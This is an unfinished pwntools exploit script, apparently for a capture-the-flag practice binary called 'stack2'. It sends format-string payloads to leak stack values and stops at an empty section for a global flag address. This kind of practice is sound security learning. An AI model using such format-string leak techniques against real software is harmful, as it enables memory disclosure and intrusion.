#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template stack2
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'stack2')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No

def get_stack_var(io: process | connect, index: int) -> int:
    io.recvuntil(b"something: ")
    io.sendline(f"%{index}$lx".encode('ascii'))
    io.recvuntil(b"said: ")
    return int(io.recvuntil(b"Say", drop=True), 16)

io = start()

# leaking all the stack vars
for i in range(1, 20):
    leak = get_stack_var(io, i)
    io.info(f"Leaked the {i}th stack var: {hex(leak)}.")

# address of the global flag var


io.interactive()

